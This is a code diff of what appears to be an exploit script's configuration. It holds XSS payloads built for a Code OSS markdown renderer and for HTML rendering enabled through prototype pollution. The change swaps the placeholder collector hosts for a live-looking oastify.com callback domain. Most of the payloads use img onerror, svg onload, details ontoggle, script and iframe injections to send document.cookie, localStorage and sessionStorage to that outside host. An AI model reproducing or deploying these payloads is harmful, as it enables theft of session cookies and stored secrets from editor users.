@@ -69,16 +69,16 @@ const CONFIG = {
     // Markdown-based XSS: <img onerror>, <svg/onload>, <details/open/ontoggle>
     // Tested against Code OSS markdown renderer with common sanitizer configs.
     markdown: [
-      '<img src=x onerror="fetch(\'https://COLLECTOR.example.com/\'+document.cookie)">',
-      '<svg/onload="fetch(\'https://COLLECTOR.example.com/c?\'+document.cookie)">',
-      '<details open ontoggle="fetch(\'https://COLLECTOR.example.com/d?\'+document.cookie)">',
+      '<img src=x onerror="fetch(\'https://01z7lq0h27vsaiurpbtqd3lqzh58tyhn.oastify.com/\'+document.cookie)">',
+      '<svg/onload="fetch(\'https://01z7lq0h27vsaiurpbtqd3lqzh58tyhn.oastify.com/c?\'+document.cookie)">',
+      '<details open ontoggle="fetch(\'https://01z7lq0h27vsaiurpbtqd3lqzh58tyhn.oastify.com/d?\'+document.cookie)">',
       '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>'
     ].join('\n'),
 
     // Plain HTML that passes through when supportHtml is polluted true
     html: [
-      '<script>fetch("https://COLLECTOR.example.com/exfil",{method:"POST",body:JSON.stringify({cookies:document.cookie,localStorage:{...localStorage},sessionStorage:{...sessionStorage},location:location.href})})</script>',
-      '<iframe src="https://COLLECTOR.example.com/steal?' + 'c="+document.cookie></iframe>'
+      '<script>fetch("https://01z7lq0h27vsaiurpbtqd3lqzh58tyhn.oastify.com/exfil",{method:"POST",body:JSON.stringify({cookies:document.cookie,localStorage:{...localStorage},sessionStorage:{...sessionStorage},location:location.href})})</script>',
+      '<iframe src="https://01z7lq0h27vsaiurpbtqd3lqzh58tyhn.oastify.com/steal?' + 'c="+document.cookie></iframe>'
     ].join('\n')
   },
 
